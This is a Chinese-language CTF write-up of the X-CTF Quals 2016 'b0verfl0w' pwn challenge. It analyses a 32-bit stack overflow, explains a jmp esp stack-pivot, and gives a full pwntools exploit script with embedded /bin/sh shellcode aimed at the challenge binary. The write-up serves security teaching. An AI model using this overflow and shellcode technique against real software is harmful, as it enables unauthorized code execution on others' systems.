---
!!! warning
    The current page still doesn't have a translation for this language.

    You can read it through google translate.

    Besides, you can also help to translate it: [Contributing](https://ctf-wiki.org/en/contribute/before-contributing/). 


title: X-CTF Quals2016 b0verfl0w-wp
date: 2023-09-05 16:00:54
tags:
- CTF
- pwn
- stack 
- stack pivot
- XCTFQuals2016
- nightmare
categories:
- pwn-wp
---

[相关资源](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/stackprivot/X-CTF Quals 2016 - b0verfl0w)  

## 文件分析

```assembly
$ checksec b0verfl0w
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

## 代码分析

明显栈溢出

```sh
int vul() {
  char s[32]; // [esp+18h] [ebp-20h] BYREF
  puts("\n======================");
  puts("\nWelcome to X-CTF 2016!");
  puts("\n======================");
  puts("What's your name?");
  fflush(stdout);
  fgets(s, 50, stdin);
  printf("Hello %s.", s);
  fflush(stdout);
  return 1;
}
```

## 攻击方法

栈上可执行 首先想着就是在s数组中写入shellcode然后跳转到s   但因为aslr栈地址随机化无法知道s的地址  也没有别的后门函数

查看`jmp`gadget发现

```assembly
$ ROPgadget --binary b0verfl0w --only "ret|jmp"
Gadgets information
============================================================
[...]
0x08048504 : jmp esp
[...]
```

### jmp esp用处

当当前函数执行到`leave`指令后（即`mov esp, ebp;pop ebp`），esp指向`ret addr`，接着`ret`跳转执行 `esp = esp + 4; eip = ret addr`

```
|------------|------...----|     |------------|------...----|
|  addr 0x11 |      ...    |  →  | addr 0x11  |      ...    |
|------------|------...----|     |------------|------...----|
↑ esp 									   ↑ esp     eip = 0x11
```

但如果ret addr处地址为`jmp esp`的地址  则执行完jmp之后，eip和esp指向同一块位置，也就是接着执行栈上的指令

```
|------------|------...----|      |------------|------...----|
|  addr 0x11 |      ...    |  →   | addr 0x11  |      ...    |
|------------|------...----|      |------------|------...----|
↑ esp 	                                       ↑ esp   eip = 0x11(jmp esp)
               |------------|------...----|
 ➤ jmp esp ➤   | addr 0x11  |      ...    |
               |------------|------...----|
                            ↑ esp,eip
```

因此我们可以在ret addr之后写入汇编指令  但是由于只有`50 - 32 = 18`字节的溢出空间，显然不够写入完整shellcode 

但是可以把shellcode写入变量s  在ret addr之后写入`sub esp, 0x28;jmp esp`   0x20(s) + 0x4(old ebp) + 0x4(ret addr) = 0x28

这样子就可以把esp移到变量s的地址，然后跳转执行s里的shellcode

## exp

```python
from pwn import *
import sys

context(os='linux', arch='i386', log_level='debug')

mode = ''
if len(sys.argv) > 1:
    mode = sys.argv[1]
proc = process("./b0verfl0w")

gscript = '''
    b * 0x0804857A
    c
'''
if mode == '-d':
    gdb.attach(proc, gdbscript=gscript)

# shellcode, from https://shell-storm.org/shellcode/files/shellcode-811.html
shcode = b"\x31\xc0\x50\x68\x2f\x2f\x73"
shcode += b"\x68\x68\x2f\x62\x69\x6e\x89"
shcode += b"\xe3\x89\xc1\x89\xc2\xb0\x0b"
shcode += b"\xcd\x80\x31\xc0\x40\xcd\x80"   

ret = 0x0804836a
jmp_esp = 0x08048504
sub_esp_jmp = asm("sub esp, 0x28;jmp esp")	# move esp back to s, then jmp to esp

proc.sendlineafter(b'name?', shcode.ljust(0x24, b'h') + p32(jmp_esp) + sub_esp_jmp)

proc.interactive()
pause()
```
